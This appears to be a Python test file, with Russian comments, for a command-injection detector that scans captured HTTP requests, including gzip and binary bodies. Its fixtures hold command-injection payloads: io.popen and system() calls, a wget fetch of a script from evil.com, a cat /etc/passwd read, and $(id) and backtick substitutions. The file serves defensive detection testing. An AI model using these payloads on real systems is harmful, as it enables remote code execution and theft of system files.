"""
Тесты CommandInjectionDetector.

Не требует ни pipeline, ни reassembly — создаём state.http_objects
напрямую через объекты HttpObject.
"""
from paradox.config import Config
from paradox.detectors.command_injection import CommandInjectionDetector
from paradox.http_object import HttpObject
from paradox.models import CaptureState, FlowKey


def _state(*requests):
    """
    requests: list of (src_ip, uri, body_bytes).
    Строит минимальный CaptureState с http_objects.
    """
    state = CaptureState()
    objs = []
    for i, (src_ip, uri, body) in enumerate(requests):
        key = FlowKey(
            proto="tcp", src_ip=src_ip, dst_ip="10.0.0.1",
            src_port=50000 + i, dst_port=80,
        )
        obj = HttpObject(
            kind="request",
            method="POST",
            uri=uri,
            headers={"host": "target.local"},
            body=body,
            body_size=len(body),
        )
        objs.append((key, obj))
    state.http_objects = objs
    return state


def test_command_injection_lua_popen():
    """io.popen — high-паттерн, confidence 0.9."""
    body = (
        b"username=anonymous%00]]%0dlocal+h+%3d+io.popen"
        b'("wget http://10.0.1.152/x")%0d'
    )
    state = _state(("10.0.1.50", "/loginok.html", body))
    findings = CommandInjectionDetector().run(state, Config())

    assert len(findings) == 1
    assert findings[0].type == "command_injection"
    assert findings[0].confidence == 0.9
    assert "io.popen" in findings[0].evidence["matched_patterns"]


def test_command_injection_php_system():
    """system( в body — high."""
    body = b"cmd=;system('cat /etc/passwd');"
    state = _state(("10.0.1.50", "/upload.php", body))
    findings = CommandInjectionDetector().run(state, Config())
    assert len(findings) == 1
    assert findings[0].confidence == 0.9
    assert "system(" in findings[0].evidence["matched_patterns"]


def test_command_injection_shell_backtick():
    """Backticks + wget — 2 medium, confidence 0.75."""
    body = b"q=`wget http://evil.com/s.sh`"
    state = _state(("10.0.1.50", "/api", body))
    findings = CommandInjectionDetector().run(state, Config())
    assert len(findings) == 1
    assert findings[0].confidence == 0.75


def test_command_injection_single_medium_not_flagged():
    """Один medium — не finding (шумно)."""
    body = b"search=whoami"
    state = _state(("10.0.1.50", "/search", body))
    findings = CommandInjectionDetector().run(state, Config())
    assert findings == []


def test_command_injection_normal_login():
    """Нормальный логин — нет finding."""
    body = b"username=admin&password=secret123"
    state = _state(("10.0.1.50", "/login", body))
    findings = CommandInjectionDetector().run(state, Config())
    assert findings == []


def test_command_injection_empty_body():
    """Пустой body — нет finding."""
    state = _state(("10.0.1.50", "/api/health", b""))
    findings = CommandInjectionDetector().run(state, Config())
    assert findings == []


def test_command_injection_response_ignored():
    """Response не проверяется — только request."""
    from paradox.models import FlowKey
    state = CaptureState()
    key = FlowKey(
        proto="tcp", src_ip="10.0.0.1", dst_ip="10.0.1.50",
        src_port=80, dst_port=50000,
    )
    obj = HttpObject(
        kind="response",
        status_code=200,
        body=b"system('ls')",  # в response это не команда
    )
    state.http_objects = [(key, obj)]
    findings = CommandInjectionDetector().run(state, Config())
    assert findings == []


def test_command_injection_aggregates_same_uri():
    """5 POST на /loginok.html с io.popen — один finding."""
    body = b"u=x%00io.popen('id')"
    requests = [("10.0.1.50", "/loginok.html", body)] * 5
    state = _state(*requests)
    findings = CommandInjectionDetector().run(state, Config())
    assert len(findings) == 1
    assert findings[0].evidence["count"] == 5


def test_command_injection_separate_uris():
    """Разные URI — разные findings."""
    b1 = b"x=io.popen('id')"
    b2 = b"y=system('ls')"
    state = _state(
        ("10.0.1.50", "/a.php", b1),
        ("10.0.1.50", "/b.php", b2),
    )
    findings = CommandInjectionDetector().run(state, Config())
    assert len(findings) == 2


def test_command_injection_empty_state():
    """Пустой state — не падает."""
    findings = CommandInjectionDetector().run(CaptureState(), Config())
    assert findings == []


# ---------- бинарные тела ----------

def _state_with_headers(src_ip, uri, body, headers):
    state = CaptureState()
    key = FlowKey(
        proto="tcp", src_ip=src_ip, dst_ip="104.21.16.1",
        src_port=50000, dst_port=80,
    )
    obj = HttpObject(
        kind="request",
        method="POST",
        uri=uri,
        headers=headers,
        body=body,
        body_size=len(body),
    )
    state.http_objects = [(key, obj)]
    return state


# gzip-магия + случайные байты + shell-паттерны: так выглядел
# трафик 2025-06-13, где 35 findings были ложными.
_GZIP_NOISE = (
    b"\x1f\x8b\x08\x00\x00\x00\x00\x00"
    + bytes(range(256)) * 4
    + b"$(`"
)


def test_command_injection_skips_octet_stream_body():
    """Бинарное тело не сканируется — "$(" и "`" в нём случайны."""
    state = _state_with_headers(
        "10.6.13.133", "/rand/path", _GZIP_NOISE,
        {"host": "evil.live", "content-type": "application/octet-stream"},
    )
    assert CommandInjectionDetector().run(state, Config()) == []


def test_command_injection_decompresses_gzip_body():
    """Сжатое тело распаковывается — команда внутри находится."""
    import gzip

    state = _state_with_headers(
        "10.6.13.133", "/api", gzip.compress(b"cmd=$(id); `whoami`"),
        {
            "host": "target.local",
            "content-type": "text/plain",
            "content-encoding": "gzip",
        },
    )
    findings = CommandInjectionDetector().run(state, Config())
    assert len(findings) == 1
    assert findings[0].confidence == 0.75


def test_command_injection_unreadable_gzip_not_scanned():
    """Заявлен gzip, но данные не gzip — не распаковывается, нет finding."""
    state = _state_with_headers(
        "10.6.13.133", "/api", b"$(id)`id`",
        {
            "host": "evil.live",
            "content-type": "text/plain",
            "content-encoding": "gzip",
        },
    )
    assert CommandInjectionDetector().run(state, Config()) == []


def test_command_injection_scans_text_body_still():
    """Текстовое тело по-прежнему проверяется."""
    state = _state_with_headers(
        "10.6.13.133", "/api", b"cmd=$(id); `whoami`",
        {"host": "target.local", "content-type": "text/plain"},
    )
    findings = CommandInjectionDetector().run(state, Config())
    assert len(findings) == 1
    assert findings[0].confidence == 0.75


def test_command_injection_scans_uri_in_binary_request():
    """URI проверяется даже при бинарном теле."""
    state = _state_with_headers(
        "10.6.13.133", "/shell.php?cmd=$(id)&x=`id`", _GZIP_NOISE,
        {"host": "evil.live", "content-type": "application/octet-stream"},
    )
    findings = CommandInjectionDetector().run(state, Config())
    assert len(findings) == 1
    assert findings[0].evidence["uri"].startswith("/shell.php")


def test_payload_sample_is_kept_for_viewer():
    """Вкладка «Код инжекта» берёт тело из payload_samples."""
    from paradox.payload_excerpt import decode_sample

    body = b"cmd=id;wget http://evil.example/x"
    state = _state(("10.0.1.50", "/api", body))
    findings = CommandInjectionDetector().run(state, Config())

    samples = findings[0].evidence["payload_samples"]
    assert len(samples) == 1
    assert decode_sample(samples[0]) == body


def test_payload_sample_can_be_disabled():
    body = b"cmd=id;wget http://evil.example/x"
    state = _state(("10.0.1.50", "/api", body))
    findings = CommandInjectionDetector().run(
        state, Config(payload_excerpt_enabled=False),
    )

    assert "payload_samples" not in findings[0].evidence
